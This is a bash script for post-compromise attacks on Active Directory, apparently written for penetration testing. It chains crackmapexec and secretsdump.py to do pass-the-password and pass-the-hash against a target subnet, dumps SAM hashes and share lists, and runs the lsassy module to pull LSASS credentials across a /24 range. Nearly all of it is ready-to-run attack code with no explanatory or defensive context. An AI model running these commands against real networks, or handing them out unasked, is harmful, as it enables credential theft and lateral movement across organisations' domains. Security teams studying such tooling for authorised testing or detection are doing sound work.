#!/bin/bash

# Function to run Pass the Password
pass_the_password() {
    echo "[+] Running Pass the Password attack..."
    crackmapexec smb $TARGET_SUBNET -u "$TARGET_USERNAME" -d $DOMAIN -p "$PASSWORD"
    secretsdump.py "$DOMAIN"/"$TARGET_USERNAME":"$PASSWORD"@"$TARGET_IP"
}

# Function to run Pass the Hash
pass_the_hash() {
    if [ -z "$HASH" ]; then
        echo "[-] Hash not provided. Skipping Pass the Hash."
        return
    fi
    echo "[+] Running Pass the Hash attack..."
    crackmapexec smb $TARGET_SUBNET -u "$LOCAL_ADMIN"  -H "$HASH" --local-auth --sam
    
    sleep 10
    
    crackmapexec smb $TARGET_SUBNET -u "$LOCAL_ADMIN" -H "$HASH" --local-auth --shares
}

# Function to run lsassy module
run_lsassy() {
    echo "[+] Running lsassy module..."
    crackmapexec smb ${TARGET_SUBNET%.*}.0/24 -u "$LOCAL_ADMIN" -H "$HASH" --local-auth -M lsassy
}

# Main execution
echo "[+] Starting post-compromise AD attacks..."

# Run attacks
pass_the_password
sleep 2
pass_the_hash
sleep 2
run_lsassy

echo "[+] Post-compromise attacks completed."
